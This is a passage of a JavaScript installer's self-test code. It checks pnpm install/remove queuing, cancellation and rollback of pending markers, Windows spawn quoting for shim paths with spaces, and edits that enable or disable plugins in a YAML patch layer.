  // 后 remove 才执行，且因目标不是依赖而 fail-fast（仍不 spawn）。
  {
    const { profileDir, cleanup } = makeTempProfile("serialize");
    try {
      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
      const { spawnFn, procs } = blockingSpawn();
      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      const installSpawned = procs.length === 1;
      const remove = runRemove({ profile: "p", packageName: "pkg-a", _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      const queuedNotSpawned = procs.length === 1;
      procs[0].finish(1, "boom");
      const installOutcome = await install.done;
      const removeOutcome = await remove.done;
      check(
        "install/remove 串行：remove 排队等待，install 结束后才执行",
        installSpawned
          && queuedNotSpawned
          && installOutcome.status === "failed"
          && removeOutcome.status === "failed"
          && /not a dependency/.test(removeOutcome.detail ?? "")
          && procs.length === 1,
        `procs=${procs.length} install=${installOutcome.status} remove=${removeOutcome.status} ${JSON.stringify(removeOutcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-0. A corrupt/existing pending marker is recovery evidence. A new
  // install must neither overwrite it nor leave its just-created snapshot.
  {
    const { profileDir, cleanup } = makeTempProfile("install-corrupt-pending");
    try {
      const marker = pendingMarkerPath(profileDir);
      mkdirSync(dirname(marker), { recursive: true });
      const corruptBytes = "{ deliberately-corrupt\n";
      writeFileSync(marker, corruptBytes);
      const { spawnFn, calls } = scriptedSpawn([]);
      const outcome = await runInstall({
        profile: "p",
        spec: "some-plugin",
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
      }).done;
      const snapshotsDir = join(dirname(marker), "snapshots");
      const leftoverSnapshots = existsSync(snapshotsDir) ? readdirSync(snapshotsDir) : [];
      check(
        "损坏/既有 pending marker → install 不 spawn、不覆盖证据、不遗留新 snapshot",
        outcome.status === "failed"
          && /already has a pending install marker/.test(outcome.detail ?? "")
          && calls.length === 0
          && readFileSync(marker, "utf8") === corruptBytes
          && leftoverSnapshots.length === 0,
        `status=${outcome.status} calls=${calls.length} snapshots=${leftoverSnapshots.join(",")} detail=${JSON.stringify(outcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b. pending marker 存在时 remove 拒绝对该 profile 动手（fail closed），
  // marker 原样保留给恢复路径。
  {
    const { profileDir, cleanup } = makeTempProfile("pending-refuse", { "pkg-b": "1.0.0" });
    try {
      mkdirSync(dirname(pendingMarkerPath(profileDir)), { recursive: true });
      writeFileSync(pendingMarkerPath(profileDir), "{}\n");
      const { spawnFn, procs } = blockingSpawn();
      const outcome = await runRemove({ profile: "p", packageName: "pkg-b", _profileDir: profileDir, _spawn: spawnFn }).done;
      check(
        "pending marker 存在 → remove 拒绝执行且不 spawn pnpm，marker 保留",
        outcome.status === "failed"
          && /pending install transaction/.test(outcome.detail ?? "")
          && procs.length === 0
          && existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} procs=${procs.length} ${JSON.stringify(outcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3c. 排队中被取消：killed 结局，pnpm 从未启动；锁随后正常释放。
  {
    const { profileDir, cleanup } = makeTempProfile("cancel-queued");
    try {
      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
      const { spawnFn, procs } = blockingSpawn();
      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      const remove = runRemove({ profile: "p", packageName: "pkg-a", _profileDir: profileDir, _spawn: spawnFn });
      remove.cancel();
      procs[0]?.finish(1, "boom");
      const installOutcome = await install.done;
      const removeOutcome = await remove.done;
      check(
        "排队中取消 → killed，未 spawn；前一个任务照常完成",
        removeOutcome.status === "killed" && procs.length === 1 && installOutcome.status === "failed",
        `remove=${removeOutcome.status} install=${installOutcome.status} procs=${procs.length}`,
      );
    } finally {
      cleanup();
    }
  }

  // 4a. spawn 计划（纯函数）：非 Windows 无 shell；Windows 有 .exe 则
  // shell:false，仅 .cmd 则 shell:true + treeKill 且 command 自带引号
  // （.cmd 常在 `D:\Program Files\nodejs` 这类带空格的目录里，shell:true 下
  // Node 只拼空格不逐参数引用，不引用就从空格截断），全找不到回退 "pnpm"。
  {
    const shimDir = mkdtempSync(join(tmpdir(), "dsh-mall-selftest-path-"));
    try {
      const planPosix = pnpmSpawnPlan({ platform: "linux", pathEnv: shimDir });
      const posixOk = planPosix.command === "pnpm" && planPosix.shell === false && planPosix.treeKill === false;
      const planMissing = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
      const missingOk = planMissing.command === "pnpm" && planMissing.shell === true && planMissing.treeKill === true;
      writeFileSync(join(shimDir, "pnpm.cmd"), "@echo off\r\n");
      const planCmd = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
      const cmdOk = planCmd.command === `"${join(shimDir, "pnpm.cmd")}"` && planCmd.shell === true && planCmd.treeKill === true;
      writeFileSync(join(shimDir, "pnpm.exe"), "MZ");
      const planExe = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
      const exeOk = planExe.command === join(shimDir, "pnpm.exe") && planExe.shell === false && planExe.treeKill === false;
      check(
        "pnpmSpawnPlan：posix 直起 / win32 优先 .exe 无 shell / 仅 .cmd 则带引号 + treeKill",
        posixOk && missingOk && cmdOk && exeOk,
        JSON.stringify({ planPosix, planMissing, planCmd, planExe }),
      );
      // 空格目录不是假想敌：Node 默认装进 Program Files，真实机器上命令从
      // 空格截断曾让「'D:\Program' 不是内部或外部命令」拦下所有预检。
      const spaceDir = join(shimDir, "dir with space");
      mkdirSync(spaceDir, { recursive: true });
      writeFileSync(join(spaceDir, "pnpm.cmd"), "@echo probe-ok\r\n");
      const planSpace = pnpmSpawnPlan({ platform: "win32", pathEnv: spaceDir });
      check(
        "pnpmSpawnPlan：带空格的 .cmd 路径 → command 自带引号",
        planSpace.shell === true && planSpace.command === `"${join(spaceDir, "pnpm.cmd")}"`,
        JSON.stringify(planSpace),
      );
      // 引用必须真的可跑：Windows 真机端到端 spawn 一轮假 shim（CI 是 Linux，
      // 只跑静态断言；Windows 上这一条覆盖完整链路）。
      if (process.platform === "win32") {
        const probe = spawnSync(planSpace.command, ["--version"], { shell: planSpace.shell, encoding: "utf8", timeout: 15000 });
        check(
          "pnpmSpawnPlan：带引号 command 真实 spawn 不再被空格截断",
          probe.status === 0 && /probe-ok/.test(probe.stdout ?? ""),
          `status=${probe.status} stdout=${JSON.stringify((probe.stdout ?? "").slice(0, 80))} stderr=${JSON.stringify((probe.stderr ?? "").slice(0, 80))}`,
        );
      }
    } finally {
      rmSync(shimDir, { recursive: true, force: true });
    }
  }

  // 4b. 取消时序：cancel() → 进程 close → killed 结局 → 回滚收 marker，
  // 回滚严格发生在进程退出之后（done 链只在 'close' 后推进）。
  {
    const { profileDir, cleanup } = makeTempProfile("cancel-order");
    try {
      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
      const { spawnFn, procs } = blockingSpawn();
      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      const spawnedAndMarked = procs.length === 1 && existsSync(pendingMarkerPath(profileDir));
      install.cancel();
      const outcome = await install.done;
      const output = (() => { let text = ""; let chunk = install.readOutput(); while (chunk.length > 0) { text += chunk; chunk = install.readOutput(); } return text; })();
      check(
        "取消在途 install → killed + 回滚收 marker（在进程退出之后）",
        spawnedAndMarked
          && outcome.status === "killed"
          && !existsSync(pendingMarkerPath(profileDir))
          && /restored profile files/.test(output),
        `status=${outcome.status} marker=${existsSync(pendingMarkerPath(profileDir))}`,
      );
    } finally {
      cleanup();
    }
  }

  return failed;
}

/**
 * The patch-layer edit behind enable/disable. Text surgery on a file users
 * hand-write, so every shape it can meet is pinned here.
 */
function runToggleFixtures() {
  let failed = 0;
  const check = (label, ok, extra = "") => {
    if (!ok) failed++;
    console.log(`  ${ok ? "PASS" : "FAIL"} ${label}${ok ? "" : `  ${extra}`}`);
  };
  // 真实环境里 patch 层默认就是这个样子——注释 + 空数组。插件由 bundle 层
  // 挂载，用户文件里一条都没有。第一版只测了「行已存在」的情形，于是停用
  // 被静默跳过、重启后插件又回来了。这组用例先钉死这个场景。
  const stockTemplate = "# Your patch layer for this dsh profile\n[]\n";
  const fresh = setPatchRowDisabled(stockTemplate, "at-file", true, "dsh-at-file");
  check("空 patch 层（模板 []）→ 追加 id 定向覆盖行", /- id: at-file/.test(fresh ?? "") && /disabled: true/.test(fresh ?? ""), JSON.stringify(fresh));
  check("空 patch 层：替换掉 [] 而不是留着", !/\[\]/.test(fresh ?? ""), JSON.stringify(fresh));
  check("空 patch 层：保留原有注释", (fresh ?? "").includes("# Your patch layer"));
  check("新建行带 name 便于 dsh 校验陈旧 patch", /name: 'dsh-at-file'/.test(fresh ?? ""));
  check("空 patch 层 + 要启用 → 不改动", setPatchRowDisabled(stockTemplate, "at-file", false, "dsh-at-file") === undefined);
  check("新建的行能被 YAML 解析且是数组", (() => {
    try { return Array.isArray(load(fresh)); } catch { return false; }
  })());
  check("新建行的语义正确（id + disabled）", (() => {
    try { const doc = load(fresh); return doc[0].id === "at-file" && doc[0].disabled === true; } catch { return false; }
  })());

  const base = "- id: at-file\n  name: dsh-at-file\n";

  const off = setPatchRowDisabled(base, "at-file", true);
  check("无 disabled 行 → 插入 disabled: true", /^\s{2}disabled: true$/m.test(off ?? ""), JSON.stringify(off));
  check("插入后其余字节不变", (off ?? "").includes("name: dsh-at-file"));

  const on = setPatchRowDisabled(`- id: at-file\n  name: dsh-at-file\n  disabled: true\n`, "at-file", false);
  check("已停用 → 改回 false", /disabled: false/.test(on ?? ""), JSON.stringify(on));

  check("已是目标状态 → 不改动", setPatchRowDisabled(`- id: at-file\n  disabled: true\n`, "at-file", true) === undefined);
  check("本就启用且要启用 → 不改动", setPatchRowDisabled(base, "at-file", false) === undefined);
  check("条目不在 patch 层 → 追加新行，原有条目不动", (() => {
    const out = setPatchRowDisabled(base, "other-id", true, "pkg-other");
    return /- id: other-id/.test(out ?? "") && (out ?? "").includes("- id: at-file");
  })());

  // 用户写的条件逻辑不能被两态开关压平——必须拒绝并让人手改。
  let threw = false;
  try { setPatchRowDisabled(`- id: at-file\n  disabled: !!js process.platform === 'win32'\n`, "at-file", false); }
  catch (error) { threw = /!!js expression/.test(error.message); }
  check("disabled 是 !!js 表达式 → 拒绝接管", threw);

  // 注释是用户手写的，一个字节都不能动。
  const commented = "# 我的覆盖\n- id: at-file   # 保留这个注释\n  name: dsh-at-file\n";
  const kept = setPatchRowDisabled(commented, "at-file", true);
  check("注释原样保留", (kept ?? "").includes("# 我的覆盖") && (kept ?? "").includes("# 保留这个注释"));

  // 多条目：只动目标那条，相邻条目不受影响。
  const multi = "- id: a\n  name: pkg-a\n- id: at-file\n  name: dsh-at-file\n- id: z\n  name: pkg-z\n  disabled: true\n";
  const one = setPatchRowDisabled(multi, "at-file", true);
  check("多条目：只动目标条目", (one ?? "").split("disabled: true").length - 1 === 2 && (one ?? "").includes("- id: z"));
  check("多条目：不误伤相邻条目的 disabled", setPatchRowDisabled(multi, "a", true)?.includes("- id: z\n  name: pkg-z\n  disabled: true") === true);

  check("带引号的 id 也能匹配", setPatchRowDisabled(`- id: '@scope/pkg'\n  name: x\n`, "@scope/pkg", true) !== undefined);
  return failed;
}

if (process.argv[1]?.endsWith("installer.js") && process.argv.includes("--self-test")) {
  console.log("启用/停用 patch 层 fixtures:");
  const toggleFailed = runToggleFixtures();
  console.log();
  console.log("allowBuilds 合并 fixtures:");
  const failed = runAllowBuildsFixtures() + toggleFailed;
  console.log(`${ALLOW_BUILDS_FIXTURES.length - failed}/${ALLOW_BUILDS_FIXTURES.length} passed`);
  // 实装 pnpm add 的参数/环境（纯函数）：peer 自动安装必须关闭，否则
  // marketplace 安装会把 @deepseek-ai 宿主依赖栈拉进 profile；构建脚本必须
  // 严格，否则 pnpm 退出码 0 却跳过构建脚本，批准闸形同虚设。
  const addArgs = liveAddArgs("some-plugin@1.0.0");
  const argsOk = addArgs[0] === "add" && addArgs[1] === "some-plugin@1.0.0"
    && addArgs.includes("--config.auto-install-peers=false")
    && addArgs.includes("--config.strict-dep-builds=true");
  const env = liveAddEnv({ KEEP_ME: "1" });
  const envOk = env.KEEP_ME === "1"
    && env.npm_config_auto_install_peers === "false" && env.NPM_CONFIG_AUTO_INSTALL_PEERS === "false"
    && env.npm_config_strict_dep_builds === "true" && env.NPM_CONFIG_STRICT_DEP_BUILDS === "true";
  console.log(`  ${argsOk && envOk ? "PASS" : "FAIL"} 实装 pnpm add：peer 自动安装关闭 + 严格构建脚本（args + env）`);
  console.log("事务 fixtures:");
  // 默认失败：若事件循环提前排空（Promise 不挂住进程），静默退出也算 FAIL。
  process.exitCode = 1;
  void runTransactionFixtures().then(
    (txFailed) => {
      process.exit(failed === 0 && argsOk && envOk && txFailed === 0 ? 0 : 1);
    },
    (error) => {
      console.error(`  FAIL 事务 fixtures 抛错: ${error?.stack ?? error}`);
      process.exit(1);
    },
  );
}
